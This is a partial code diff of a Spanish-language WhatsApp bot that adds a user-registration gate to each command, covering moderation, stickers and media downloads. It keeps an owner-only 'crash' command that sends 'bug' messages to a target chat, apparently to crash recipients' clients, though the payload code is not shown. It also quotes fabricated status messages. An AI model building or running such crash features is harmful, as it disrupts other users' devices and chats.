 reply(`𝐆𝐫𝐚𝐜𝐢𝐚𝐬 𝐩𝐨𝐫 𝐮𝐬𝐚𝐫 ${botName}, 𝐡𝐚𝐬𝐭𝐚 𝐥𝐚 𝐩𝐫𝐨𝐱𝐢𝐦𝐚`)
@@ -606,6 +584,7 @@ inky.groupLeave(from)
 break
 
 case 'kick':
+if (!isUser) return reply(mess.only.reg)
 if (!isGroup) return reply(mess.only.group)
 if (!isBotAdmin) return reply(mess.only.botadmin)
 if (!isGroupAdmins) return reply(mess.only.admins)
@@ -625,6 +604,7 @@ inky.groupRemove(from, mentioned)
 break
 
 case 'add':
+if (!isUser) return reply(mess.only.reg)
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admins)
 if (!isBotAdmin) return reply(mess.only.botadmin)
@@ -639,6 +619,7 @@ reply('𝐍𝐨 𝐬𝐞 𝐩𝐮𝐝𝐨 𝐚𝐠𝐫𝐞𝐠𝐚𝐫 𝐞𝐥 
 break
 
 case 'linkgc':
+if (!isUser) return reply(mess.only.reg)
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admins)
 if (!isBotAdmin) return reply(mess.only.botadmin)
@@ -647,6 +628,7 @@ reply(`𝐀𝐪𝐮𝐢 𝐞𝐬𝐭𝐚 𝐞𝐥 𝐥𝐢𝐧𝐤 𝐝𝐞 *${g
 break
 
 case 'hidetag':
+if (!isUser) return reply(mess.only.reg)
 if (!q) return reply('𝐄𝐬𝐜𝐫𝐢𝐛𝐚 𝐮𝐧 𝐭𝐞𝐱𝐭𝐨')
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admins)
@@ -666,6 +648,7 @@ await inky.sendMessage(from, options, text)
 break
 
 case 'tagall':
+if (!isUser) return reply(mess.only.reg)
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admins)
 members_id = []
@@ -679,6 +662,7 @@ mentions('╔══✪〘 𝐓𝐚𝐠𝐀𝐥𝐥 〙✪══\n╠➥'+teks+`�
 break
 
 case 'promote':
+if (!isUser) return reply(mess.only.reg)
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admins)
 if (!isBotAdmin) return reply(mess.only.botadmin)
@@ -698,6 +682,7 @@ inky.groupMakeAdmin(from, mentioned)
 break
 
 case 'demote':
+if (!isUser) return reply(mess.only.reg)
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admins)
 if (!isBotAdmin) return reply(mess.only.botadmin)
@@ -718,6 +703,7 @@ inky.groupDemoteAdmin(from, mentioned)
 break
 
 case 'opengc':
+if (!isUser) return reply(mess.only.reg)
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admins)
 if (!isBotAdmin) return reply(mess.only.botadmin)
@@ -730,6 +716,7 @@ inky.sendMessage(from, open, text, {quoted: sendFakeStatus, sendEphemeral: true}
 break
 
 case 'closegc':
+if (!isUser) return reply(mess.only.reg)
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admins)
 if (!isBotAdmin) return reply(mess.only.botadmin)
@@ -745,6 +732,7 @@ break
 // Seccion Economia
 
 case 'bal':
+if (!isUser) return reply(mess.only.reg)
 const userBal = checkATMuser(sender)
 textoBalance = `➫ 𝐁𝐚𝐥𝐚𝐧𝐜𝐞
 ➼ 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: ${pushname}
@@ -756,6 +744,7 @@ break
 
 case 's':
 case 'sticker':
+if (!isUser) return reply(mess.only.reg)
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
 var media = await inky.downloadAndSaveMediaMessage(encmedia)
@@ -818,12 +807,14 @@ reply(`𝐄𝐧𝐯𝐢𝐞 𝐮𝐧𝐚 𝐢𝐦𝐚𝐠𝐞𝐧 𝐜𝐨𝐧 �
 break
 
 case 'attp':
+if (!isUser) return reply(mess.only.reg)
 if (!q) return reply(`𝐔𝐬𝐚: ${prefix + command}𝐭𝐞𝐱𝐭𝐨`)
 attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${q}`)
 inky.sendMessage(from, attp2, MessageType.sticker, {quoted: mek, sendEphemeral: true})
 break
 
 case 'robar':
+if (!isUser) return reply(mess.only.reg)
 if (!isQuotedSticker) return reply(`𝐄𝐭𝐢𝐪𝐮𝐞𝐭𝐚 𝐮𝐧 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐜𝐨𝐧 𝐞𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨: *${prefix + command} 𝐧𝐨𝐦𝐛𝐫𝐞|𝐚𝐮𝐭𝐨𝐫*`)
 const encmediats = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 var kls = q
@@ -841,6 +832,7 @@ inky.sendMessage(from, imageBuffer, sticker, {quoted: mek, sendEphemeral: true})
 break
 
 case 'tomp3':
+if (!isUser) return reply(mess.only.reg)
 if (!isQuotedVideo) return reply(`𝐄𝐭𝐢𝐪𝐮𝐞𝐭𝐞 𝐚 𝐮𝐧 𝐯𝐢𝐝𝐞𝐨 𝐜𝐨𝐧 𝐞𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨 ${prefix + command}`)
 reply(mess.wait)
 var encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
@@ -856,6 +848,7 @@ fs.unlinkSync(ran)
 break
 
 case 'tts':
+if (!isUser) return reply(mess.only.reg)
 if (!q) return reply(`𝐔𝐬𝐚: ${prefix + command} <𝐢𝐝𝐢𝐨𝐦𝐚> <𝐭𝐞𝐱𝐭𝐨>`)
 const gtts = require('./lib/gtts')(args[0])
 dtt = body.slice(8)
@@ -872,6 +865,7 @@ break
 // Seccion Internet
 
 case 'igstalk':
+if (!isUser) return reply(mess.only.reg)
 if (!q) return reply(`𝐔𝐬𝐚: ${prefix + command} <𝐮𝐬𝐮𝐚𝐫𝐢𝐨>`)
 reply(mess.wait) 
 ig.fetchUser(`${args.join(' ')}`).then(Y => {
@@ -891,6 +885,7 @@ sendMediaURL(from,ten,teks)
 break
 
 case 'ytsearch':
+if (!isUser) return reply(mess.only.reg)
 if (!q) return reply(`𝐄𝐬𝐜𝐫𝐢𝐛𝐚 𝐮𝐧𝐚 𝐥𝐨 𝐪𝐮𝐞 𝐝𝐞𝐬𝐞𝐞 𝐛𝐮𝐬𝐜𝐚𝐫\𝐧𝐄𝐣𝐞𝐦𝐩𝐥𝐨: ${prefix + command} 𝐒𝐡𝐢𝐧𝐠𝐚𝐭𝐬𝐮 𝐰𝐚 𝐤𝐢𝐦𝐢 𝐧𝐨 𝐮𝐬𝐨`)
 resvi = await yts(q)
 searchyt = `${botName} 𝐘𝐨𝐮𝐭𝐮𝐛𝐞 𝐒𝐞𝐚𝐫𝐜𝐡\n`
@@ -921,6 +916,7 @@ sendFileFromUrl(resvi.all[0].image, image, {quoted: fakeStatusYts, caption: inky
 break
 
 case 'play':
+if (!isUser) return reply(mess.only.reg)
 teks = args.join(' ')
 if (!teks.endsWith("-doc")){
 res1 = await yts(q).catch(e => {
@@ -959,6 +955,7 @@ sendFileFromUrl(res1[0].link, audio, {quoted: fakeStatusMusic, sendEphemeral: tr
 break
 
 case 'tiktok':
+if (!isUser) return reply(mess.only.reg)
 if (!q) return reply(`𝐈𝐧𝐠𝐫𝐞𝐬𝐞 𝐞𝐥 𝐥𝐢𝐧𝐤 𝐝𝐞𝐥 𝐯𝐢𝐝𝐞𝐨`)
 if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.error.link)
 reply(mess.wait)
@@ -976,7 +973,29 @@ break
 
 // Otros
 
+case 'register':
+if (isUser) return reply(`𝐔𝐬𝐭𝐞𝐝 𝐲𝐚 𝐞𝐬𝐭𝐚 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨 𝐞𝐧 ${botName}`)
+try {
+ppimg = await inky.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
+} catch {
+ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+}
+teks = `𝐑𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨 𝐞𝐱𝐢𝐭𝐨𝐬𝐚𝐦𝐞𝐧𝐭𝐞
+
+➼ *𝐍𝐨𝐦𝐛𝐫𝐞:* ${pushname}
+➼ *𝐖𝐚𝐦𝐞*: wa.me/${sender.split("@")[0]}
+➼ *𝐓𝐚𝐠:* @${sender.split("@s.whatsapp.net")[0]}
+
+𝐔𝐬𝐚 ${prefix}𝐦𝐞𝐧𝐮 𝐩𝐚𝐫𝐚 𝐯𝐞𝐫 𝐥𝐚 𝐥𝐢𝐬𝐭𝐚 𝐝𝐞 𝐜𝐨𝐦𝐚𝐧𝐝𝐨𝐬`
+user.push(sender)
+addATM(sender)
+fs.writeFileSync('./database/user.json', JSON.stringify(user))
+let buff = await getBuffer(ppimg)
+inky.sendMessage(from, buff, MessageType.image, {quoted: fakeStatus, sendEphemeral: true, caption: teks})
+break
+
 case 'itsme':
+if (!isUser) return reply(mess.only.reg)
 try {
 ppimg = await inky.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
 } catch {
@@ -995,11 +1014,13 @@ case 'owner':
 case 'creator':
 case 'creador':
 case 'inky':
+if (!isUser) return reply(mess.only.reg)
 reply(`𝐆𝐫𝐚𝐜𝐢𝐚𝐬 𝐩𝐨𝐫 𝐮𝐭𝐢𝐥𝐢𝐳𝐚𝐫 𝐚 ${botName}, 𝐀𝐛𝐚𝐣𝐨 𝐞𝐬𝐭𝐚 𝐞𝐥 𝐧𝐮𝐦𝐞𝐫𝐨 𝐝𝐞𝐥 𝐜𝐫𝐞𝐚𝐝𝐨𝐫 𝐝𝐞 𝐥𝐚𝐬 𝐛𝐚𝐬𝐞 𝐝𝐞 𝐝𝐚𝐭𝐨𝐬 𝐝𝐞𝐥 𝐛𝐨𝐭, 𝐧𝐨 𝐦𝐨𝐥𝐞𝐬𝐭𝐚𝐫 :D`)
 await sendContact(from, '595995660558', "🖤𝐈𝐧𝐤𝐲🖤")
 break
 
 case 'report':
+if (!isUser) return reply(mess.only.reg)
 if (!q) return reply(`𝐄𝐣𝐞𝐦𝐩𝐥𝐨:\n${prefix}𝐫𝐞𝐩𝐨𝐫𝐭 𝐄𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨 ${prefix}𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐧𝐨 𝐚𝐧𝐝𝐚`)
 var numerorepo = mek.participant
 report = `𝐑𝐞𝐩𝐨𝐫𝐭𝐞
@@ -1032,6 +1053,7 @@ reply(`𝐒𝐮 𝐫𝐞𝐩𝐨𝐫𝐭𝐞 𝐡𝐚 𝐬𝐢𝐝𝐨 𝐞𝐧�
 break
 
 case 'join':
+if (!isUser) return reply(mess.only.reg)
 try {
 if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
 return reply(mess.link);
@@ -1047,6 +1069,7 @@ reply("𝐋𝐢𝐧𝐤 𝐢𝐧𝐯𝐚𝐥𝐢𝐝𝐨");
 break
 
 case 'leermas':
+if (!isUser) return reply(mess.only.reg)
 if (!q) return reply(`𝐔𝐬𝐚 ${prefix + command} 𝐓𝐞 𝐚𝐦𝐨|𝐫𝐝𝐢𝐝𝐨 𝐮𝐧 𝐩𝐞𝐫𝐫𝐨`)
 tels = q
 var teks1 = tels.split("|")[0];
@@ -1059,15 +1082,9 @@ break
 
 // Seccion Owner
 
-case 'scrash':
+case 'crash':
 if (!isOwner) return reply(mess.only.owner)
 if (!q) return
-sendBug(from, `${q}`)
-sendBug(from, `${q}`)
-sendBug(from, `${q}`)
-sendBug(from, `${q}`)
-sendBug(from, `${q}`)
-sendBug(from, `${q}`)
 sendBug(from, `${q}`)
 break
 
